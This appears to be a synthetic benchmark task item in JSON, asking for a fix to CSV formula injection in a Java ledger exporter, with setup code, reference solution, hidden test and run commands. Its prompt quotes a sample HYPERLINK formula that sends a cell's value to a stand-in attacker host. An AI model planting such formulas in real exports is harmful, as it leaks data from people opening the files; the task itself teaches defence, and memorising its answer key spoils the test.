@@ -1,0 +1,52 @@
+{
+  "id": "java-ledger-009-csv-export-formula-injection",
+  "base": "java-ledger",
+  "language": "java",
+  "category": "security",
+  "difficulty": "medium",
+  "prompt": "Security review of the new CSV export (`io.CsvExporter`), severity medium.\n\nTransaction descriptions come from user input: imported bank memos, splitter memos,\nfree text typed by staff. A description such as\n\n    =HYPERLINK(\"http://evil.invalid/?d=\"&A1,\"Refund status\")\n\nis written to the export as-is, so when finance opens the file in a spreadsheet it\nbecomes a live formula (CSV / formula injection). The same goes for text starting with\n`+`, `-` or `@`.\n\nExpected: any text cell that a spreadsheet would treat as a formula (first character\n`=`, `+`, `-`, `@`, tab or carriage return) is exported in the neutralised form OWASP\ndescribes, so a description `=1+2` shows up in the file as the text `'=1+2`. Everything\nelse stays as it is: ordinary descriptions are unchanged, numeric columns (the amount)\nremain plain numbers, and the output is still valid CSV that `CsvImporter` can read back.",
+  "setup": [
+    {
+      "file": "src/main/java/com/example/ledger/io/CsvExporter.java",
+      "create": "package com.example.ledger.io;\n\nimport com.example.ledger.Entry;\nimport com.example.ledger.Ledger;\nimport com.example.ledger.Transaction;\nimport java.util.ArrayList;\nimport java.util.List;\n\n/**\n * Exports two-entry transfers in the importer's format\n * ({@code date,description,from,to,amount,currency}) so finance can open them in a\n * spreadsheet or re-import them with {@link CsvImporter}. Transactions with more than\n * two entries are skipped.\n */\npublic final class CsvExporter {\n    private CsvExporter() {\n    }\n\n    public static List<String> exportLines(Ledger ledger) {\n        List<String> lines = new ArrayList<>();\n        lines.add(String.join(\",\", CsvImporter.HEADER));\n        for (Transaction tx : ledger.journal()) {\n            if (tx.entries().size() != 2) {\n                continue;\n            }\n            Entry first = tx.entries().get(0);\n            Entry second = tx.entries().get(1);\n            Entry from = first.amount().isNegative() ? first : second;\n            Entry to = from == first ? second : first;\n            lines.add(String.join(\",\",\n                    tx.date().toString(),\n                    CsvParser.quote(tx.description()),\n                    from.accountId(),\n                    to.accountId(),\n                    to.amount().toDecimal().toPlainString(),\n                    to.amount().currency()));\n        }\n        return lines;\n    }\n\n    public static String export(Ledger ledger) {\n        return String.join(\"\\n\", exportLines(ledger)) + \"\\n\";\n    }\n}\n"
+    }
+  ],
+  "solution": [
+    {
+      "file": "src/main/java/com/example/ledger/io/CsvExporter.java",
+      "find": "                    CsvParser.quote(tx.description()),",
+      "replace": "                    textCell(tx.description()),"
+    },
+    {
+      "file": "src/main/java/com/example/ledger/io/CsvExporter.java",
+      "find": "    public static String export(Ledger ledger) {",
+      "replace": "    /** A spreadsheet-safe text cell: formula triggers get a leading apostrophe. */\n    static String textCell(String value) {\n        if (!value.isEmpty() && \"=+-@\\t\\r\".indexOf(value.charAt(0)) >= 0) {\n            value = \"'\" + value;\n        }\n        return CsvParser.quote(value);\n    }\n\n    public static String export(Ledger ledger) {"
+    }
+  ],
+  "gold_files": [
+    "src/main/java/com/example/ledger/io/CsvExporter.java"
+  ],
+  "hidden": [
+    {
+      "src": "hidden/HiddenCsvFormulaTest.java",
+      "dest": "src/test/java/com/example/ledger/HiddenCsvFormulaTest.java"
+    }
+  ],
+  "commands": [
+    [
+      "javac",
+      "-d",
+      "{out}",
+      "{glob:src/main/java/**/*.java}",
+      "{glob:src/test/java/**/*.java}"
+    ],
+    [
+      "java",
+      "-cp",
+      "{out}",
+      "com.example.ledger.HiddenCsvFormulaTest"
+    ]
+  ],
+  "timeout_s": 120,
+  "attribution": "Synthetic task authored for repo-ai (MIT)."
+}
